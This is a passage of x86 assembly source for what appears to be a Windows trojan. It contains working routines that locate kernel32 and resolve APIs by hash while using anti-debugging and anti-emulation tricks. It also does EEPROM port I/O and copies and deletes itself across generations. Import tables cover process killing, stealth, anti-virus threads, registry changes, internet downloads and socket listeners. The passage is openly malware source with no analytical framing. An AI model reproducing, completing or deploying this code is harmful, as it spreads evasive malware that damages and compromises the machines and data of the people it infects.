                        mov     [ecx], al
                        retn

; ***************************
; * IO for EEPROM           *
; ***************************

IOForEEPROM:
                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, eax
                        xchg    eax, edi
                        xchg    edx, ebp
                        in      al, dx

BooleanCalculateCode    =       $
                        or      al, 44h

                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, eax
                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, al

                        retn
                        
_get_r0_mark:       pusha
            mov esi, 0c0203ff0h
            lodsb
            call    $+5
__load:         pop ebp
            mov byte ptr [ebp+_which_gen-__load], al
            popa
            retf

_store_r0_mark:     pusha
            mov     edi, 0c0203ff0h
            call    $+5
__load2:        pop ebp
            mov al, byte ptr [ebp+_which_gen-__load2]
            stosd
            popa
            retf

; ---------------------------------------------------------------------------
; alocates memory on heap
; i: eax = size
;
; o: eax = ptr na trazenu memoriju
; ---------------------------------------------------------------------------
malloc:         push    eax
            push    HEAP_ZERO_MEMORY
            db  068h
_dd_heap_handle dd  ?
            db  0b8h
_dd_HeapAlloc       dd  ?           
            call    eax
            retn

; ---------------------------------------------------------------------------
; frees memory on heap
; i: eax = ptr to memory to free
;
; o: nothing
; ---------------------------------------------------------------------------
free:           push    eax
            push    0
            db  068h
_dd_heap_handle_1   dd  ?
            db  0b8h
_dd_HeapFree        dd  ?
            call    eax
            retn

; ---------------------------------------------------------------------------
; binary -> ASCII
; i: eax = numba
;    edi = ptr to storage buffer
;
; o: nothing
; ---------------------------------------------------------------------------
num2ascii:      push    eax
            @pushsz "%lu"
            push    edi
            db  0b8h
_dd_wsprintfA       dd  ?           
            call    eax
            add esp, 12
            retn

; ---------------------------------------------------------------------------
; ASCII -> binary
; i: esi = ptr to ACIIZ
;
; o: eax = numba
; ---------------------------------------------------------------------------
ascii2num:      xor eax, eax
            mov ecx, eax

__1:            lodsb
            xor eax, "0"
            cmp eax, 10
            jnc __2

            imul    ecx, ecx, 10
            add ecx, eax
            jmp __1

__2:            xchg    eax, ecx
            retn


NT_startup:     push    0
            @pushsz "Poruka"
            @pushsz "vindoze NT detektiran"
            push    0
            callg   MessageBoxA
            
            jmp troj_exit

; ---------------------------------------------------------------------------
; creates a thread
; i: eax = ptr to thread start address
;
; o: eax = handle
; ---------------------------------------------------------------------------
Create_Thread:      cdq
            push    edx
            push    esp
            push    edx
            push    edx
            push    eax
            push    2000h
            push    edx
            callg   CreateThread
            
            pop edx
            ret

; ---------------------------------------------------------------------------
; checks connection to Internet, relative to gdelta
; i: nothing
;
; o: ecx = TRUE true if connection exists, otherwise FALSE
; ---------------------------------------------------------------------------
onlyne:
IFDEF   LOCALHOST
            @retecx1                    ; on localhost we r always online
ELSE
            xor eax, eax
            push    eax
            push    esp
            callg   InternetGetConnectedState
            xchg    eax, ecx
            retn
ENDIF

; ---------------------------------------------------------------------------
; looks for imagebase of kernel32.dll
; i: nothing
;
; o: eax = imagebase od kernel32.dll
; ---------------------------------------------------------------------------
get_base:
            call    __tab                   ; kernel imagebase table for different versions of vindoze:
            dd  077E00000h              ; NT/W2k
            dd  077E80000h              ; NT/W2k
            dd  077ED0000h              ; NT/W2k
            dd  077F00000h              ; NT/W2k
            dd  0BFF70000h              ; 95/98
            dd  077E60000h              ; XP home
            dd  0BFF60000h              ; Me

__tab:          pop esi
            push    7
            pop ebx                 ; ebx = counter

__nxt_base:     dec ebx
            lodsd                       ; take one imagebase
            call    _krnl_check             ; and check it
            jecxz   __got_kernel

            test    ebx, ebx                ; check table end
            jnz __nxt_base

            mov eax, fs:[TEB_PEB]           ; take ptr to PEB
            test    eax, eax                ; > 80000000h ?
            js  __PEB_try               ; !NT
    
                mov eax, [eax.PEB_PebLdrData]
            mov esi, [eax.PEB_LDR_InInitOrderModuleList.LE_Flink]
            lodsd                       ; go to second entry
            mov eax, [eax.LDR_ModuleBase-LDR_InInitializationOrderLdrEnt.LE_Flink]
            call    _krnl_check

            jecxz   __got_kernel
            
__PEB_try:      call    __PEB_x
            mov  esp,[esp.EH_EstablisherFrame]      ; set SEH frame manually
            jmp __PEB_failed
__PEB_x:        xor eax, eax
            push    dword ptr fs:[eax]
            mov fs:[eax], esp
            mov eax, fs:[TEB_PEB]           ; *PEB
            mov eax, [eax+34h]
            mov eax, [eax+0b8h]             ; now eax should be kernel's imagebase
            call    _krnl_check
__PEB_failed:       @SEH_RemoveFrame
            jecxz   __got_kernel
            
__rec_scan:     mov eax, [esp.(2*Pshd).Arg1.cPushad]    ; take kernel return address. skip pushad, SEH and one call
            and eax, -1 shl 16              ; align to 10 pages
            add eax, 2 shl 15               ; add 10 pages

__1:            sub eax, 2 shl 15               ; and loop per 10 pages
            call    _krnl_check
            jecxz   __got_kernel

            jmp __1                 ; we r gonna find that bloody kernel :)

__got_kernel:       ret

_krnl_check:        mov ecx, eax                ; gotta set ecx so that we can return true
            pusha

            call    __temp
            mov esp, [esp.EH_EstablisherFrame]      ; set SEH manually
            jmp __end_k

__temp:         xor edx, edx
            push    dword ptr fs:[edx]
            mov fs:[edx], esp

            mov edx, [eax.MZ_lfanew]            ; take RVA to PE header
            mov ebx, [edx+eax]              ; check PE signature
            xor ebx, 'SUN'              ; indirectly
            sub ebx, IMAGE_NT_SIGNATURE xor 'SUN'   ; lil sig
            jnz __end_k

            cmp eax, [edx+ecx.NT_OptionalHeader.OH_ImageBase]   ; check the predefined imagebase
            jnz __end_k

            xor ecx, ecx                ;no kernel for us :(

__end_k:        @SEH_RemoveFrame
            mov [esp.Pushad_ecx], ecx
            popa

__end:          retn

; ---------------------------------------------------------------------------
; searches for the address of specified API by export table scanning
; i: ebx = dll imagebase
;    TOS = API hash
;
; o: eax = API's address, 0 on error
; ---------------------------------------------------------------------------
load_dll_address:
            pusha
            call    __seh_init              ; setup SEH manually
            mov esp, [esp.EH_EstablisherFrame]
            jmp __end
            
__seh_init:     xor edx, edx
            push    dword ptr fs:[edx]
            mov fs:[edx], esp

            mov ecx, [ebx.MZ_lfanew]            ; take RVA of PE header
            mov ecx, [ecx+ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
            jecxz   __err                   ; check whether there is export directory RVA

            add ecx, ebx                ; if so, normalize with imagebase
            xor esi, esi                ; initialize counter
__k_l:          lea edx, [4*esi+ebx]
            add edx, [ecx.ED_AddressOfNames]        ; take ptr to array of ptrs to functions names
            mov edx, [edx]              ; take RVA of ptr to name of the API
            add edx, ebx                ; normalize
            xor eax, eax                ; initialize hash
            add eax, fs:[eax.TEB_ClientId.CID_UniqueProcess]    ; anti-debugging

__1:            rol eax, 7                  ; hash algo starts here. (x) by z0mbie
            xor al, [edx]
            inc edx                 ; next letter
            cmp byte ptr [edx], 0           ; end of name?
            jnz __1                 ; nope, repeat again

            cmp eax, [esp.(2*Pshd).Arg1.cPushad]    ; compare it with given hash; skip pushad+SEH+call+param
            jz  __bingo                 ; yippie

            inc esi                 ; counter++
            cmp esi, [ecx.ED_NumberOfNames]     ; compare counter with the number of exported functions
            jb  __k_l                   ; if below, repeat it

__err:          xor eax, eax                ; either exception occured, or we didn't find API. either way, set return value to false
            jmp __end

__bingo:        mov edx, [ecx.ED_AddressOfOrdinals]     ; take RVA to array of API ordinals
            add edx, ebx                ; normalize
            movzx   edx, word ptr [edx+esi*2]       ; x2 coz its an array of WORDs
            ;sub    edx, [ecx.ED_BaseOrdinal]
            mov eax, [ecx.ED_AddressOfFunctions]    ; take RVA of an array of APIs addresses
            add eax, ebx                ; normalize
            mov eax, [eax+edx*4]            ; x4 coz its an array of DWORDs
            add eax, ebx                ; normalize

__end:          @SEH_RemoveFrame                ; remove SEH frame
            mov [esp.Pushad_eax],eax            ; set return address
            popa

            push    dword ptr [esp]
            mov [esp.Pshd], cs              ; anti-emu
            retf    (Pshd)

; ---------------------------------------------------------------------------
; caculates CRC32
; i: edx = ptr to array
;    ecx = length in bytes
;
; o: eax = CRC32
;    edx += ecx
;    ecx = 0
;-+------------------------------------------------------------------------+-
CRC32:          jecxz   __4
            
            push    ebx
            not     eax
__1:            xor     al, [edx]
            inc     edx
            mov     bl, 8
__2:            shr     eax, 1
            jnc     __3

            xor     eax, 0EDB88320h
__3:            dec     bl
            jnz     __2

            loop    __1
            
            not     eax
            pop     ebx
__4:            ret

kme_start:
include         ..\kme\kme.asm
kme_end:

hash_table_kernel32:
    whash   <OpenMutexA, CloseHandle, SetErrorMode, HeapCreate, RegisterServiceProcess, ExpandEnvironmentStringsA>
    whash   <GetModuleFileNameA, CopyFileA, Sleep, WaitForMultipleObjects, TerminateThread, CreateThread>
    whash   <ExitThread, GetLastError, CreateMutexA, GetTickCount, CompareStringA, CreatePipe, PeekNamedPipe>
    whash   <WinExec, WriteFile, CreateFileA, MoveFileA, DeleteFileA, GetExitCodeProcess, ReadFile>
    whash   <SetCurrentDirectoryA, HeapAlloc, HeapFree, HeapDestroy, CreateProcessA, RemoveDirectoryA>
    whash   <CreateDirectoryA, GetCurrentDirectoryA, FindFirstFileA, FindNextFileA, FindClose, GetVersion>
    whash   <GetComputerNameA, GetFileSize, CreateToolhelp32Snapshot, Process32First, Process32Next, OpenProcess>
    whash   <TerminateProcess, GetCurrentProcessId, VirtualAlloc, GetCommandLineA, GetModuleHandleA, FreeLibrary, ExitProcess>

address_table_kernel32:
_OpenMutexA             dd  0
_CloseHandle                dd  0
_SetErrorMode               dd  0
_HeapCreate             dd  0
_RegisterServiceProcess         dd  0
_ExpandEnvironmentStringsA      dd  0
_GetModuleFileNameA         dd  0
_CopyFileA              dd  0
_Sleep                  dd  0
_WaitForMultipleObjects         dd  0
_TerminateThread            dd  0
_CreateThread               dd  0
_ExitThread             dd  0
_GetLastError               dd  0
_CreateMutexA               dd  0
_GetTickCount               dd  0
_CompareStringA             dd  0
_CreatePipe             dd  0
_PeekNamedPipe              dd  0
_WinExec                dd  0
_WriteFile              dd  0
_CreateFileA                dd  0
_MoveFileA              dd  0
_DeleteFileA                dd  0
_GetExitCodeProcess         dd  0
_ReadFile               dd  0
_SetCurrentDirectoryA           dd  0
_HeapAlloc              dd  0
_HeapFree               dd  0
_HeapDestroy                dd  0
_CreateProcessA             dd  0
_RemoveDirectoryA           dd  0
_CreateDirectoryA           dd  0
_GetCurrentDirectoryA           dd  0
_FindFirstFileA             dd  0
_FindNextFileA              dd  0
_FindClose              dd  0
_GetVersion             dd  0
_GetComputerNameA           dd  0
_GetFileSize                dd  0
_CreateToolhelp32Snapshot       dd  0
_Process32First             dd  0
_Process32Next              dd  0
_OpenProcess                dd  0
_TerminateProcess           dd  0
_GetCurrentProcessId            dd  0
_VirtualAlloc               dd  0
_GetCommandLineA            dd  0
_GetModuleHandleA           dd  0
_FreeLibrary                dd  0
_ExitProcess                dd  0
No_api_kernel32 equ ($-address_table_kernel32)/4

hash_table_shlwapi:
    whash   <SHSetValueA, SHGetValueA, SHDeleteKeyA>

address_table_shlwapi:
_SHSetValueA                dd  0
_SHGetValueA                dd  0
_SHDeleteKeyA               dd  0
No_api_shlwapi equ  ($-address_table_shlwapi)/4

hash_table_user32:
    whash   <PeekMessageA, MessageBoxA, wsprintfA, GetForegroundWindow, MessageBeep, IsIconic, CloseWindow>
    whash   <PostMessageA, GetOpenClipboardWindow, OpenClipboard, EmptyClipboard, CloseClipboard, ExitWindowsEx>
    whash   <EnumWindows, GetWindowThreadProcessId, GetWindowTextA>

address_table_user32:
_PeekMessageA               dd  0
_MessageBoxA                dd  0
_wsprintfA              dd  0
_GetForegroundWindow            dd  0
_MessageBeep                dd  0
_IsIconic               dd  0
_CloseWindow                dd  0
_PostMessageA               dd  0
_GetOpenClipboardWindow         dd  0
_OpenClipboard              dd  0
_EmptyClipboard             dd  0
_CloseClipboard             dd  0
_ExitWindowsEx              dd  0
_EnumWindows                dd  0
_GetWindowThreadProcessId       dd  0
_GetWindowTextA             dd  0
No_api_user32 equ   ($-address_table_user32)/4

hash_table_wininet:
    whash   <InternetGetConnectedState, InternetOpenA, InternetCloseHandle, InternetOpenUrlA, InternetQueryDataAvailable>
    whash   <InternetReadFile>

address_table_wininet:
_InternetGetConnectedState      dd  0
_InternetOpenA              dd  0
_InternetCloseHandle            dd  0
_InternetOpenUrlA           dd  0
_InternetQueryDataAvailable     dd  0
_InternetReadFile           dd  0
No_api_wininet equ  ($-address_table_wininet)/4

hash_table_wsock32:
    whash   <WSAStartup, WSACleanup, socket, closesocket, gethostbyname, WSAGetLastError, recv>
    whash   <connect, send, setsockopt, gethostname, htons, bind, listen, accept, select, inet_ntoa>
    whash   <htonl, inet_addr>

address_table_wsock32:
_WSAStartup             dd  0
_WSACleanup             dd  0
_socket                 dd  0
_closesocket                dd  0
_gethostbyname              dd  0
_WSAGetLastError            dd  0
_recv                   dd  0
_connect                dd  0
_send                   dd  0
_setsockopt             dd  0
_gethostname                dd  0
_htons                  dd  0
_bind                   dd  0
_listen                 dd  0
_accept                 dd  0
_select                 dd  0
_inet_ntoa              dd  0
_htonl                  dd  0
_inet_addr              dd  0
No_api_wsock32 equ  ($-address_table_wsock32)/4

hash_table_advapi32:
    whash   <OpenSCManagerA>

address_table_advapi32:
_OpenSCManagerA             dd  0
No_api_advapi32 equ ($-address_table_advapi32)/4

hash_table_msvcrt:
    whash   <atoi>

address_table_msvcrt:
_atoi                   dd  0
No_api_msvcrt   equ ($-address_table_msvcrt)/4

hash_table_winmm:
    whash   <mciSendStringA>

address_table_winmm:
_mciSendStringA             dd  0
No_api_winmm    equ ($-address_table_winmm)/4

log_handle      dd  0

inet_threadz        dd  INET_THREADZ_COUNT dup(?)
h_killer_thread     dd  0
h_stealth_thread    dd  0
h_stealth_thread2   dd  0
h_av_thread     dd  0
heap_handle     dd  0
kernel          dd  0
_onlyne_flag        db  0
_traced         db  0                   
_which_gen      db  0                   ; 0 -> first time -> set mark to 1 -> create a copy and execute it -> self-delete
                                    ; 1 -> set mark to 2 -> adjust startkey -> continue with execution
                                    ; 2-> phase 2 is already in progress.. self-delete and exit peacefully
DLL_INIT kernel32                           ; initialize dll records
DLL_INIT shlwapi
DLL_INIT user32
DLL_INIT wininet
DLL_INIT wsock32
DLL_INIT advapi32
DLL_INIT msvcrt
DLL_INIT winmm

troj_end:
troj_size       equ $-troj_start

include         ..\maplib\fioexlow.inc
include         ..\maplib\fioex.inc

end start
end
